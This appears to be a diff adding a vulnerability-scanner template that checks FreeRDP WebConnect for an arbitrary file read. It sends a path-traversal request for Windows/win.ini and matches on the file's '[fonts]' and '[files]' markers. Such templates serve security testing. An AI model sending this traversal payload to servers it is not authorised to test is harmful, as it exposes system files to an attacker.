@@ -1,0 +1,25 @@
+id: freerdp-webconnect-url-anyfile-read
+info:
+  name: FreeRDP WebConnect Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    FreeRDP WebConnect is vulnerable to arbitrary file read, allowing attackers to access sensitive files on the server.
+http:
+  - method: GET
+    path:
+      - "/../../../../Windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[files]"
+      - type: word
+        words:
+          - "<"
+        negative: true
